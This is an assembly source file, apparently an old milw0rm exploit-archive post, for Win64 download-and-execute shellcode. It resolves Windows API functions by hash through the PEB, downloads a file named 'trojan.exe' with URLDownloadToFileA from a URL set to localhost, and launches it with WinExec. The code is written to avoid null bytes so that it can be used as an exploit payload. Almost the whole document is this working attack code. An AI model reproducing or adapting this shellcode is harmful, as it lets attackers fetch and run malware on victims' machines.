;
; dexec64.asm - 218+ bytes (unoptimised)
;
; Win64 asm code, download & execute file using URLDownloadToFileA moniker & WinExec
;
; tested on AMD64 running Windows x64 SP1
;
; there probably are errors in the code, but this is more of an experimental source if nothing else.
; send corrections or errors to: 'weiss' wyse101 [at] gmail [dot] com
; code is not optimised at all, doesn't contain null bytes, so is possibly suitable for testing exploits on win64
;
; one of the main stumbling blocks in coding x64 asm on windows is the alignment of the stack.
; it must be aligned by 16 bytes because windows uses 128-bit SSE2, otherwise the api call will fail.
;
; thanx:
;
; roy g biv/29a - http://www.29a.net/
; Feryno - http://feryno.host.sk
; Tomasz Grysztar - http://flatassembler.org
;
format PE64 console 4.0
entry entrypoint

section '.text' code readable writeable executable     ; assumed to be writeable when in memory, no NX obstruction!

                                           ; 1*8 is used rather than 0*8 because it uses null byte
LoadLibraryA         equ  rbp+1*8          ; using rbp is smaller than using ebp on 64-bit
WinExec              equ  rbp+2*8
URLDownloadToFileA   equ  rbp+3*8          ; must be rbp because of 64-bit URLMON base address

entrypoint:
   jmp get_eip
load_dta:
   pop  rax
   push rax
   lea  r15,[rax-(setup_stack-hashes)]
   inc  byte [rax-(setup_stack-url_end)]          ; nullify tail end of url
   inc  byte [rax-(setup_stack-fname_end)]        ; nullify end of filename
   inc  byte [rax-(setup_stack-url_mon_end)]      ; nullify end of URLMON
   ret                                            ; go!

hashes:
   dw  0bb86h         ; LoadLibraryA()     635bbb86
   dw  0a333h         ; WinExec()          208da333

   db  'URLMON',0ffh,0ffh
url_mon_end   =   $-2

   dw  05f92h         ; URLDownloadToFileA    c91e5f92
   dq  -1
fname:
   db  'trojan.exe',0ffh                        ; what to save as
fname_end  =   $-1

url:
   db  'http://localhost/trojan.exe',0ffh       ; where to download file from
url_end  =   $-1

get_eip:
   call  load_dta
setup_stack:
   add  rsp,-(4*8)    ; 3 api variables, + 1 for avoiding null :-|
   push  rsp
   pop  rbp           ; rbp = table of api
   mov  rdi,rbp       ; rdi points to table also
   stosq              ; doesn't really do anything.
   add  rsp,-(11*8)   ; reserve space for windows, when calling api

   push 60h           ; Hello, Ratter. 8-D
   pop rcx
   mov rax,[gs:rcx]   ; Peb
   mov rax,[rax+18h]  ; PebLdr
   mov rsi,[rax+30h]  ; Ldr.InInitializationOrderModuleList
   lodsq              ; skip ntdll.dll
   mov rbx,[rax+10h]  ; kernel32.dll base

   mov cl,2                     ; get 2 api first
get_apis_loop:
   mov  eax,dword[rbx+3ch]      ; MZ header size
   lea  rsi,[rbx+rax+78h]       ; export directory begins at 88h
   mov  eax,dword[rsi+10h]      ; extra instructions needed to avoid null bytes
   lea  rsi,[rbx+rax+1ch]

   lodsd
   lea  r9,[rax+rbx]
   lodsd
   lea  r10,[rax+rbx]
   lodsd
   lea  r11,[rax+rbx]
   xor  r12,r12
load_index:
   mov  esi,dword[r10+4*r12]
   add  rsi,rbx
   inc  r12
   xor  eax,eax
   cdq
hash_export:
   lodsb
   add  edx,eax
   rol  edx, 5
   dec  eax
   jns  hash_export
   ror  edx, 5
   cmp  dx,word [r15]            ; found api?
   jne  load_index

   movzx  edx,word [r11+2*r12-2]
   mov  eax,[r9+4*rdx]
   add  rax,rbx
   add  r15,2                  ; skip hash

   stosq                       ; save api address
   loop get_apis_loop

   push  r15                   ; push/pop to avoid null with mov
   pop  rcx
   call  qword[LoadLibraryA]

   xchg  rax,rbx
   add  r15,8                   ; skip URLMON, first time.
   push  1                      ; get 1 api from URLMON
   pop  rcx
   test  rbx,rbx                ; continue if not zero
   jne   get_apis_loop

   dec  ecx
   push  rbx
   sub  rsp,3*8                 ; needed to align stack
   xor  r9,r9
   mov  r8,r15
   lea  rdx,[r8+(url-fname)]
   call  qword[URLDownloadToFileA]

   push 1
   pop  rdx
   mov rcx,r15
   call  qword[WinExec]       ; WinExec("trojan.exe",SW_SHOWNORMAL??);

   ;jmp   $                   ; hang

   call qword[ExitProcess]    ; not required, testing only

; section below not required, simply for testing.
section '.idata' import data readable writeable

  dd 0,0,0,RVA kernel_name,RVA kernel_table
  dd 0,0,0,0,0

  kernel_table:
    ExitProcess dq RVA _ExitProcess
    dq 0

  kernel_name db 'KERNEL32.DLL',0

  _ExitProcess dw 0
    db 'ExitProcess',0

; July 2006 - (Ireland)

; milw0rm.com [2006-08-07]